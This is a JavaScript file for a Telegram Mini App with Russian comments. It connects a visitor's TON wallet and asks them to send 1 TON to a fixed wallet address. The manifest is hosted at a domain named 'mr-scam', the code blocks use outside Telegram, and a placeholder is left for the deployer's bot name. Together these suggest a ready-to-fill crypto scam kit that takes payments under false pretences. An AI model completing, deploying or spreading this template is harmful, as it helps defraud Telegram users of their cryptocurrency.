window.addEventListener('load', () => {
  const tg = window.Telegram.WebApp;

  if (!tg.initDataUnsafe || !tg.initData) {
    // Не в Telegram — показываем блокировку
    document.getElementById('app').style.display = 'none';
    document.getElementById('blocked').style.display = 'block';
  } else {
    // В Telegram — запускаем приложение
    tg.expand();
    tg.ready();

    const usernameEl = document.getElementById('username');
    let username = 'Guest';
    if (tg.initDataUnsafe.user) {
      const user = tg.initDataUnsafe.user;
      username = user.username ? '@' + user.username : user.first_name || 'User';
    }
    usernameEl.textContent = 'Профиль: ' + username;

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
      buttonRootId: 'connect-container',
      actionsConfiguration: {
        twaReturnUrl: 'https://t.me/ТВОЙ_БОТ_ЮЗЕРНЕЙМ'  // ← Замени на юзернейм бота!
      }
    });

    let connectedWallet = null;
    tonConnectUI.onStatusChange(wallet => {
      if (wallet) {
        connectedWallet = wallet.account.address;
        document.getElementById('payment-section').style.display = 'block';
      } else {
        connectedWallet = null;
        document.getElementById('payment-section').style.display = 'none';
      }
    });

    document.getElementById('payment-btn').onclick = async () => {
      if (!connectedWallet) {
        alert('⚠️ Подключите кошелёк сначала!');
        return;
      }

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [{
          address: 'UQBxxQgA8-hj4UqV-UGNyg8AqOcLYWPsJ4c_3ybg8dyH7jiD',
          amount: '1000000000' // 1 TON
        }]
      };

      try {
        await tonConnectUI.sendTransaction(transaction);
        alert('✅ 1 TON успешно внесено!');
      } catch (e) {
        alert('❌ Ошибка или отменено');
      }
    };
  }
});
